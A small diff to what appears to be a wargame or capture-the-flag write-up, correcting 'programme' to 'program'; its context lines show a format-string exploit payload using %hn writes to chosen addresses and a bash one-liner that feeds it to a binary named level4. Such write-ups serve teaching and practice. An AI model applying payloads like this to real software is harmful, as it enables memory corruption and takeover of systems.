@@ -67,7 +67,7 @@ Writting a value using `hn` (int on only 2 bytes) and padding:
 Giving the payload:
 `"\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"`
 
-Start the programme with the payload:
+Start the program with the payload:
 ```bash
 python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"' > attack.txt; cat attack.txt - | ./level4
 ```
